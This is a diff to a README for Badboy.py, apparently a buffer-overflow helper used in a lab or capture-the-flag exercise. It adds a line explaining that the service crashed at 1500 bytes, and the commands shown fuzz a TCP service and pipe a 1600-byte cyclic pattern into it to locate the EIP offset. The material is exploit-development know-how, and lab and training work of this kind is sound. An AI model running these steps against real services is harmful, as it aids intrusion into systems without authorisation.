@@ -13,7 +13,8 @@ python3 Badboy.py --mode fuzz -c raw-tcp [IP] [PORT] [PREFIX]
 ```
 ![Fuzzing](img/fuzz.png)
 ## Injecting Cyclic Pattern in order to Control EIP
-
+From the previous step, we can see that the service crashed at 1500 bytes.
+I then decided to generate a cyclic pattern of 1600 bytes (100 bytes more), just in case.
 ```
 msf-pattern_create -l 1600 | python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" --cpattern 1
 ```
